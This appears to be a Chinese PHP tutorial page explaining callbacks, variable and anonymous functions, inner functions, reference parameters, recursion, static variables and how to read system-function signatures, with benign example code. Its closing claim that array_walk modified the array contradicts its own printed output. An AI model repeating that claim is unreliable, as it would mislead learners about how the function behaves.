<p><font face="Comic sans MS">回调函数，可以配合匿名函数和变量函数实现更加优美、复杂的一种函数结构。<br>回调函数，就是在处理一个功能的时候，我让让这个功能自定义能力再强一些，我准许调用这个函数的时候，还可以传入一个函数配合、协助进行处理。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> woziji(<span class="variable">$one</span>,<span class="variable">$two</span>,<span class="variable">$func</span>)&#123;</span><br><span class="line">       //我规定：检查<span class="variable">$func</span>是否是函数，如果不是函数停止执行本段代码，返回<span class="literal">false</span></span><br><span class="line">       <span class="keyword">if</span>(!is_callable(<span class="variable">$func</span>))&#123;</span><br><span class="line">               <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       //我把<span class="variable">$one</span>、<span class="variable">$two</span>相加，再把<span class="variable">$one</span>和<span class="variable">$two</span>传入<span class="variable">$func</span>这个函数中处理一次</span><br><span class="line">       //<span class="variable">$func</span>是一个变量函数，参见变量函数这一章</span><br><span class="line">       <span class="built_in">echo</span> <span class="variable">$one</span> + <span class="variable">$two</span> + <span class="variable">$func</span>(<span class="variable">$one</span>,<span class="variable">$two</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//我们定义几个函数试试</span><br><span class="line"><span class="keyword">function</span> plusx2( <span class="variable">$foo</span> , <span class="variable">$bar</span>)&#123;</span><br><span class="line">       <span class="variable">$result</span> = (<span class="variable">$foo</span>+<span class="variable">$bar</span>)*2;</span><br><span class="line">       <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> jian( <span class="variable">$x</span> , <span class="variable">$y</span> )&#123;</span><br><span class="line">   <span class="variable">$result</span> = <span class="variable">$x</span> - <span class="variable">$y</span>;</span><br><span class="line">   <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line">//调用一下函数，woziji，向里面传入参数试试</span><br><span class="line"><span class="built_in">echo</span> woziji(20,10,<span class="string">&#x27;plusx2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">//将plusx2改成jian试试结果</span><br><span class="line"><span class="built_in">echo</span> woziji(20,10,<span class="string">&#x27;jian&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>处理过程是这样的:</strong><br>    1.将20赋值给形参$one,10赋值给了$two，而plusx2或者jian这两个变量函数，赋值给了$func<br>    2.在woziji这个函数中判断plusx2或者jian是否为函数，不是函数就return false 停止执行了<br>    3.显示plusx2或者jian是函数。因此$one &#x3D; 20, $two &#x3D;10相加了，相加后，$one和$two又带入到了了$func($one,$two)中。<br>    4.带入至里面后而$func，是可变的，可以为plusx2或者jian。如果为plusx2的话，$one &#x3D; 20,$two &#x3D; 10 的这个两个结果又给        了plusx2函数里面的$foo和$bar<br>    5.$foo + $bar 乘以2后将结果返回至woziji这个函数功能体的运算处：$one + $two + $func($one,$two);<br>    6.这样得到了运算结果<br>现在我们明白了回调函数：在一个调数里面，再传入一个函数名，将函数名加上()括号。识为变量函数，配合执行。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-变量函数"><a href="#1-3-变量函数" class="headerlink" title="1.3 变量函数"></a><font color="#3CB371" face="Comic sans MS">1.3 变量函数</font></h4><p><font color="red"><strong>function demo(){}<br>$fu &#x3D; ‘demo’;<br>$fu();</strong><br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS">在之前的变量部份，我们学习了可变变量。可变函数仅仅是可变变量的一个变种、变形表达。<br><font color="#00B2EE"><strong>可变函数</strong></font>，我们也会称呼为变量函数。简单回顾一下之前的知识点：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$hello</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="variable">$world</span> = <span class="string">&#x27;你好&#x27;</span>;</span><br><span class="line"><span class="comment">//输出的结果为：你好</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$hello</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>因为$hello先被解释成了world，再world前加上$符就输出了：你好。</p>
</blockquote>
<p>&amp;emsp;<br>而<font color="#00B2EE"><strong>变量函数</strong></font>的用法是这样的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;天王盖地虎&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;小鸡炖蘑菇&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fu</span> = <span class="string">&#x27;demo&#x27;</span>;</span><br><span class="line"><span class="comment">//把$fu变为了demo,把demo后加上了一个括号，就执行函数了</span></span><br><span class="line"><span class="variable">$fu</span>();</span><br><span class="line"><span class="comment">//把$fu的值改为test字符串再试试？</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-匿名函数"><a href="#1-4-匿名函数" class="headerlink" title="1.4 匿名函数"></a><font color="#3CB371" face="Comic sans MS">1.4 匿名函数</font></h4><p><strong>匿名函数，也就是</strong><font color="red"><strong>没有函数名的函数。</strong></font></p>
<p>匿名函数的第一种用法，直接把赋数赋值给变量，调用变量即为调用函数。<br>匿名函数的写法比较灵活。</p>
<p><font color="#00B2EE"><strong>1.变量函数式的匿名函数</strong></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$greet</span> = <span class="keyword">function</span>(<span class="variable">$name</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$name</span>.<span class="string">&#x27;，你好&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$greet</span>(<span class="string">&#x27;明天&#x27;</span>);</span><br><span class="line"><span class="variable">$greet</span>(<span class="string">&#x27;PHP中文网&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上例中的函数体没有函数名，通过$greent加上括号来调用的，这就是匿名函数。</p>
</blockquote>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>2.回调式的匿名函数</strong></font><br>实际使用场景中，我们要通过一个函数实现更多的功能。但是，我又不想专门定义一个函数。我们回顾一下，我们回调函数的例子：</p>
<p><font face="Comic sans MS"></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> woziji(<span class="variable">$one</span>,<span class="variable">$two</span>,<span class="variable">$func</span>)&#123;</span><br><span class="line">       //我规定：检查<span class="variable">$func</span>是否是函数，如果不是函数停止执行本段代码，返回<span class="literal">false</span></span><br><span class="line">       <span class="keyword">if</span>(!is_callable(<span class="variable">$func</span>))&#123;</span><br><span class="line">               <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       //我把<span class="variable">$one</span>、<span class="variable">$two</span>相加，再把<span class="variable">$one</span>和<span class="variable">$two</span>传入<span class="variable">$func</span>这个函数中处理一次</span><br><span class="line">       //<span class="variable">$func</span>是一个变量函数，参见变量函数这一章</span><br><span class="line">       <span class="built_in">echo</span> <span class="variable">$one</span> + <span class="variable">$two</span> + <span class="variable">$func</span>(<span class="variable">$one</span>,<span class="variable">$two</span>);</span><br><span class="line">&#125;</span><br><span class="line">woziji(20,30,<span class="keyword">function</span>( <span class="variable">$foo</span> , <span class="variable">$bar</span>)&#123;</span><br><span class="line">               <span class="variable">$result</span> = (<span class="variable">$foo</span>+<span class="variable">$bar</span>)*2;</span><br><span class="line">               <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">           &#125;</span><br><span class="line">);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>仔细推理一下过程哟。只不过在之前的章节当中，plusx2换成了我们的匿名函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span>( <span class="variable">$foo</span> , <span class="variable">$bar</span>)&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$result</span> = (<span class="variable">$foo</span>+<span class="variable">$bar</span>)*2;</span><br><span class="line"></span><br><span class="line">       <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>因此，函名函数在调用的时候没有函数名。我们可以采用以上的一些方法来使用匿名函数。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-5-内部函数"><a href="#1-5-内部函数" class="headerlink" title="1.5 内部函数"></a><font color="#3CB371" face="Comic sans MS">1.5 内部函数</font></h4><p><strong>内部函数，是指</strong><font color="red"><strong>在函数内部又声明了一个函数。</strong></font></p>
<p><font face="Comic sans MS"><strong>注意事项：</strong></p>
<ol>
<li>内部函数名，不能是已存在的函数名</li>
<li>假设在函数a里面定义了一个内部函数，不能定用两次函数a。</font></li>
</ol>
<p>我们下面来看代码，你将很快的学习会：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> foo()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;我是函数foo哟，调一下我才会执行定义函数bar的过程&lt;br /&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">function</span> bar()</span><br><span class="line"> &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&#x27;在foo函数内部有个函数叫bar函数&lt;br /&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//现在还不能调用bar()函数，因为它还不存在</span><br><span class="line">//bar(); //如果现在调用会报错</span><br><span class="line">foo();</span><br><span class="line"></span><br><span class="line">//现在可以调用bar()函数了，因为foo()函数的执行使得bar()函数变为已定义的函数</span><br><span class="line">bar();</span><br><span class="line">//再调一次foo()看看是不是会报错？  会报错</span><br><span class="line">foo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>仔细观察和实验后你会得出如下的结论：<br>   1.foo()调用两次会报错<br>   2.如果不调foo()函数无法执行bar函数，因为bar是在foo的内部</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-6-参数的引用"><a href="#1-6-参数的引用" class="headerlink" title="1.6 参数的引用"></a><font color="#3CB371" face="Comic sans MS">1.6 参数的引用</font></h4><p>在变量这个函数中，我们学习了变量的引用，我们来回顾一下知识：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&#x27;---------&#x27;</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上述知识点的在变量章节中，变量引用有讲述，是指变量$a和$b指向到了同一个存储位置，来存值。</p>
</blockquote>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>而函数的参数引用，也是这个意思，将形参和实参指向到同一个位置。如果形参在函数体内发生变化，那么实参的值也发生变化。我们来通过实验来看看：</strong></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = 100;</span><br><span class="line"></span><br><span class="line">//注意：在<span class="variable">$n</span>前面加上了&amp;符</span><br><span class="line"><span class="keyword">function</span> demo(&amp;<span class="variable">$n</span>)&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$n</span> = 10;</span><br><span class="line"></span><br><span class="line">       <span class="built_in">return</span> <span class="variable">$n</span> + <span class="variable">$n</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>  demo(<span class="variable">$foo</span>).<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//你会发生<span class="variable">$foo</span>的值变为了10</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$foo</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过上例，我们发现实参为$foo，在调用demo的时候，<font color="red"><strong>让$foo和$n指向到了同一个存储区域</strong></font>，当$n的值发生变化的时候。那么$foo的值也发生变化。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-7-递归函数"><a href="#1-7-递归函数" class="headerlink" title="1.7 递归函数"></a><font color="#3CB371" face="Comic sans MS">1.7 递归函数</font></h4><p>递归函数，递归只是一个名字，而递归函数的规定：<font color="red"><strong>函数体内调用函数自己</strong></font>。<br>递归在实际工作中主要是用在：<font color="red"><strong>文件和文件夹操作</strong></font>的时候有使用到。</p>
<p><font face="Comic sans MS"><font color="#00B2EE"><strong>几个思维上的盲区：</strong></font><br>  1.代码是从上到下执行的，所有代码没有exit等停止符，函数必须执行完。<br>  2.如果函数从函数A跳至函数B后，必须把函数B执行完成再执行函数A余下的代码。<br>  3.递归函数必须要能执行完有结束条件，不然函数就会限入死循环。函数会永远的自我执行下去。<br></font></p>
<p>我们来写一代码码来理解一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$num</span> = 10;</span><br><span class="line">//调用一次函数A();</span><br><span class="line">A(<span class="variable">$num</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> A( <span class="variable">$arg</span> )&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$arg</span>;</span><br><span class="line">   //在函数A里面去，跑去执行函数B去了</span><br><span class="line">   B(<span class="variable">$arg</span>);</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;我们需要不断的努力，努力到上天都为我们感动&#x27;</span>;</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$arg</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> B( <span class="variable">$number</span> )&#123;</span><br><span class="line">       <span class="built_in">echo</span> <span class="variable">$number</span>;</span><br><span class="line">       <span class="built_in">echo</span> <span class="string">&#x27;俺是狗蛋，执行完了&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong><br>1.执行函数A到一半的时候，跑去执行了函数B<br>2.执行完函数B，先显示出来的是：“俺是狗蛋，执行完了”，接着显示的才是：“我们需要不断的努力，努力到上天都为我们感动”<br>3.也就是证明了我们所说思维盲区里面的内容，代码从上到下执行，代码必须执行完。</p>
</blockquote>
<p>&amp;emsp;<br>  我们来写一个简单的递归代码,让函数自己调用自己。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$n</span> = <span class="number">2</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dg</span>(<span class="params"> <span class="variable">$n</span> </span>)</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$n</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">   <span class="variable">$n</span> = <span class="variable">$n</span> - <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$n</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">       <span class="comment">//在函数体内调用了dg自己哟</span></span><br><span class="line">       dg(<span class="variable">$n</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;--------------&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;俺是狗蛋，俺还没执行&#x27;</span> . <span class="variable">$n</span> . <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们来仔细推理一次：<br>   1.第一次调用dg()，将数字$n &#x3D; 2传到dg中，先显示出来了2<br>   2.然后将$n - 1 $n的值为了1<br>   3.接着判断$n 是否大于0,肯定是大于0的，所以调用递归自己，再把自己执行一次。<br>   4.而第二次在执行自己dg()的时候，而最下面的 echo ‘俺是狗蛋，俺还没执行’ . $n . ‘<br>‘; 还没有执行到。等待执行完成后再来执行<br>   5.$n此时等于1 ，所以显示出来1。<br>   6.$n把自己减了一次，$n的结果为0<br>   7.$n大于0肯定不成立的，所以显示了一条:”————–”<br>   8.而这个时候该执行：echo ‘俺是狗蛋，俺还没执行’ . $n . ‘<br>‘;<br>   9.第二次执行dg()执行完成。第一次dg()的代码还没执行完，将第4点中的余下代码执行完。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-8-静态变量"><a href="#1-8-静态变量" class="headerlink" title="1.8 静态变量"></a><font color="#3CB371" face="Comic sans MS">1.8 静态变量</font></h4><p><font face="Comic sans MS"><font color="red"><strong>静态变量的特点是：</strong></font>声明一个静态变量，第二次调用函数的时候，静态变量不会再初始化变量，会在原值的基础上读取执行。<br>实际上:全局变量本身就是静态存储方式,<font color="red"><strong>所有的全局变量都是静态变量</strong></font><br></font></p>
<p><font color="#FF7F00"><strong>以下讲述局部静态变量和全局静态变量：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//--------------如何理解static静态变量-----------</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/** 普通局部变量 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">local</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="variable">$loc</span> = <span class="number">0</span>; <span class="comment">//这样，如果直接不给初值0是错误的。</span></span><br><span class="line"> ++<span class="variable">$loc</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$loc</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">local(); <span class="comment">//1</span></span><br><span class="line">local(); <span class="comment">//1</span></span><br><span class="line">local(); <span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;===================================&lt;br/&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** static静态局部变量 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">static_local</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="built_in">static</span> <span class="variable">$local</span> = <span class="number">0</span> ; <span class="comment">//此处可以不赋0值</span></span><br><span class="line"> <span class="variable">$local</span>++;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$local</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">static_local(); <span class="comment">//1</span></span><br><span class="line">static_local(); <span class="comment">//2</span></span><br><span class="line">static_local(); <span class="comment">//3</span></span><br><span class="line"><span class="comment">//echo $local; 注意虽然静态变量，但是它仍然是局部的，在外不能直接访问的。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;=======================================&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** static静态全局变量(实际上:全局变量本身就是静态存储方式,所有的全局变量都是静态变量) */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">static_global</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">global</span> <span class="variable">$glo</span>; <span class="comment">//此处，可以不赋值0，当然赋值0，后每次调用时其值都为0，每次调用函数得到的值都会是1，</span></span><br><span class="line"> <span class="comment">//但是不能想当然的写上&quot;static&quot;加以修饰，那样是错误的.</span></span><br><span class="line"> <span class="variable">$glo</span>++;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$glo</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">static_global(); <span class="comment">//1</span></span><br><span class="line">static_global(); <span class="comment">//2</span></span><br><span class="line">static_global(); <span class="comment">//3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二-系统函数"><a href="#二-系统函数" class="headerlink" title="二. 系统函数"></a><font color="#FF6347" face="Comic sans MS">二. 系统函数</font></h3><h4 id="2-1-使用介绍"><a href="#2-1-使用介绍" class="headerlink" title="2.1 使用介绍"></a><font color="#3CB371" face="Comic sans MS">2.1 使用介绍</font></h4><p><font color="#00B2EE">[<a href="http://www.php.cn/">PHP手册下载</a>]</font></p>
<ol>
<li>如果代码能赚钱，帮你赚钱最多的是基本语法</li>
<li>如果你还在当程序员，你看手册的时间可能比你看老婆的时间还长</li>
</ol>
<p><font face="Comic sans MS">使用函数的重点是三块：<br>    1.了解函数的<font color="red">功能</font>，特别是常用函数的功能<br>    2.了解函数的<font color="red">参数</font><br>    3.了解函数的<font color="red">返回值</font><br></font></p>
<blockquote>
<p>我们针对上面的三块，讲解6个函数，这6个函数，概况了函数的基本用法的全部注意事项：<br><font color="#00B2EE"><strong>1. 直接返回布尔型，如bool copy ()<br>2. 带有MIXED参数的函数如何调用。Mixed表示任何类型的数据。如Array_unshift()<br>3. 参数中带有&amp;符的参数，一定要传一个变量做为参数。函数里面改变了他的值。<br>4. 带有[]的参数，表示可选项。<br>5. 带有…的参数，表示可以传任意多个参数。<br>6. 带有callback的参数，表示回调函数。需要传一个函数进来。Array_map()<br>7. 函数支持的版本要了解。</strong><br></font></p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. 直接返回布尔型</strong></font><br><font color="red"><strong>bool</strong></font> <strong>copy ( string $source , string $dest [, resource $context ] )</strong><br></font></p>
<blockquote>
<p><strong>这个函数的功能为：</strong> 拷备一个文件<br><strong>返回值为为：</strong> bool型值，就是成功返回true，失败返回false<br><strong>参数为：</strong> 两个字符串的值，一个是copy的源文件，一个为目标文件。第三个参数可选的，不常用，我们不管它。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(copy(<span class="string">&#x27;abc.txt&#x27;</span>,<span class="string">&#x27;bcd.txt&#x27;</span>))&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;复制成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;复制失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. Mixed表示任何类型的数据。如Array_unshift()</strong></font> </font><br><font color="red"><strong>int</strong></font> array_unshift ( array &amp;$array , <font color="red"><strong>mixed</strong></font>  $value1 [, mixed $… ] )</p>
<p><font face="Comic sans MS"></font></p>
<blockquote>
<p><strong>功能：</strong> 操作一个数组，向数组中之前插入其他类型的参数。<br><strong>返回值：</strong> <font color="#FF7F00"><strong>int 类型</strong></font>，可能就是插入成功最后的个数<br><strong>参数：</strong> <font color="#FF7F00"><br><strong>第一个参数为&amp;符</strong></font>，也就是在操作的过程中，改变了第一个参数的值。引用传参。也就是操作这个数组，向这个数组中传入参数。会直接改变这个数组的值。<font color="#FF7F00"><br><strong>第二个参数为mixed</strong></font>，因为数组可以存入多个不同的类型.mixed是指混合的意思。因此，mixed是指可传入任意类型<font color="#FF7F00"><br><strong>第三个数数加了中括号[ ]</strong></font>，我们所有遇到中括号的。都是指后面的参数可传，也可以不传。<br>第四，最后还看到了三个…(省略号)。代表可以传入任意多个参数。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$queue</span> = array(<span class="string">&quot;凤姐&quot;</span>, <span class="string">&quot;芙蓉&quot;</span>);</span><br><span class="line">array_unshift(<span class="variable">$queue</span>, <span class="string">&quot;杨幂&quot;</span>, <span class="string">&quot;姚晨&quot;</span>);</span><br><span class="line">print_r(<span class="variable">$queue</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Array ( [0] =&gt; 杨幂 [1] =&gt; 姚晨 [2] =&gt; 凤姐 [3] =&gt; 芙蓉 )</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. 遇到callback的传函数或者匿名函数进去协助处理，让功能更强大。</strong></font><br></font><br>bool array_walk ( array &amp;$array , <font color="red"><strong>callable</strong></font> $callback [, mixed $userdata &#x3D; NULL ] )</p>
<p><font face="Comic sans MS"></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：</strong></font><br>传入一个回调函数，将数组的原来的组操作，并且发生变化。<font color="#FF7F00"><br><strong>返回值：</strong></font><br>bool 值 也就是意味着，提示成功或者失败<font color="#FF7F00"><br><strong>参数：</strong></font><br>第一个参数是要操作的数组。<br>第二个参数是callback 代表着可以传入函数或者匿名函数。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$shuaige</span> = array(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;wuyanzhu&quot;</span>, <span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;huangxiaoming&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;ninzetao&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> test_print(<span class="variable">$item2</span>, <span class="variable">$key</span>)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$key</span> .<span class="string">&quot; ---&quot;</span>. strtoupper(<span class="variable">$item2</span>) . <span class="string">&quot;&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$shuaige</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">array_walk(<span class="variable">$shuaige</span>, <span class="string">&#x27;test_print&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;用自定义函数test_print执行后的效果：&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$shuaige</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  string(8) <span class="string">&quot;wuyanzhu&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line">  string(13) <span class="string">&quot;huangxiaoming&quot;</span></span><br><span class="line">  [<span class="string">&quot;c&quot;</span>]=&gt;</span><br><span class="line">  string(8) <span class="string">&quot;ninzetao&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">a ---WUYANZHU</span><br><span class="line">b ---HUANGXIAOMING</span><br><span class="line">c ---NINZETAO</span><br><span class="line">用自定义函数test_print执行后的效果：</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  string(8) <span class="string">&quot;wuyanzhu&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line">  string(13) <span class="string">&quot;huangxiaoming&quot;</span></span><br><span class="line">  [<span class="string">&quot;c&quot;</span>]=&gt;</span><br><span class="line">  string(8) <span class="string">&quot;ninzetao&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过上例，我们发现数组中的每个参数和值都被修改了。上例大家只需要理解看见传callback的，需要传入函数协助处理就可以。不用理解。我们在下一章的数组部份，学习完数组，大家可以再看看。<br>函数支持的版本号很重要。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
